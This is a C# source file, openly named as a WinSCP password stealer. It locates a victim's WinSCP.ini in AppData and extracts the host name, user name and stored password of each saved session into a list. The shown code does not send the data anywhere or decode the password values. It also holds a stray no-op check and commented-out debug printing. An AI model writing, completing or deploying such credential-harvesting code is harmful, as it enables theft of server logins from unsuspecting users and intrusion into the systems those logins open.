using StackifyMiddleware;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static System.Collections.Specialized.BitVector32;

namespace WSCPPasswordStealler
{
    public class Parser
    {
        private readonly Dictionary<string, Dictionary<string, string>> _sections;

        public Parser()
        {
            _sections = new Dictionary<string, Dictionary<string, string>>();
        }

        private void ParserFile(string filePath)
        {
            if (filePath == "" || filePath == null)
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                filePath = Path.Combine(appDataPath, "WinSCP.ini");
                if (!File.Exists(filePath)) ;

            }

            if (!File.Exists(filePath))
                throw new FileNotFoundException($"INI file not found: {filePath}");

            string currentSection = "";
            var lines = File.ReadAllLines(filePath);

            foreach (var line in lines)
            {
                var trimmedLine = line.Trim();


                if (string.IsNullOrEmpty(trimmedLine) || trimmedLine.StartsWith(";"))
                    continue;

                var sectionMatch = Regex.Match(trimmedLine, @"^\[([^\]]+)\]$");
                if (sectionMatch.Success)
                {
                    currentSection = sectionMatch.Groups[1].Value;
                    if (!_sections.ContainsKey(currentSection))
                        _sections[currentSection] = new Dictionary<string, string>();
                    continue;
                }

                var keyValueMatch = Regex.Match(trimmedLine, @"^([^=]+)=(.*)$");
                if (keyValueMatch.Success && !string.IsNullOrEmpty(currentSection))
                {
                    var key = keyValueMatch.Groups[1].Value.Trim();
                    var value = keyValueMatch.Groups[2].Value.Trim();
                    _sections[currentSection][key] = value;
                }
            }
        }
        public List<Connection> ParserConnections(string filePath)
        {
            
            ParserFile(filePath);
            List<Connection> connections = new List<Connection>();
            foreach (var section in _sections)
            {
                var sectionName = section.Key;
                if (sectionName.StartsWith("Configuration") ||
                   sectionName.StartsWith("SshHostKeys") ||
                   sectionName.StartsWith("CDCache"))
                    continue;
                var properties = section.Value;
                if (properties.ContainsKey("HostName") &&
                    properties.ContainsKey("UserName") &&
                    properties.ContainsKey("Password"))
                {
                    Connection con = new Connection(properties.GetValueOrDefault("Password", ""), properties.GetValueOrDefault("UserName", ""), properties.GetValueOrDefault("HostName", ""));

                    connections.Add(con);
                   
                }
                //Console.WriteLine(connections.Count);
               
            }
            //foreach (Connection c in connections)
            //{
            //    Console.WriteLine(c._username);
            //    Console.WriteLine(c._host);
            //}
            return connections;
        }
        public class Connection
        {
            public string _password { get; set; }

            public string _username { get; set; }

            public string _host { get; set; }

            public Connection(string password, string username, string host)
            {
                this._password = password;
                this._username = username;
                this._host = host;
            }
        }
    }
}
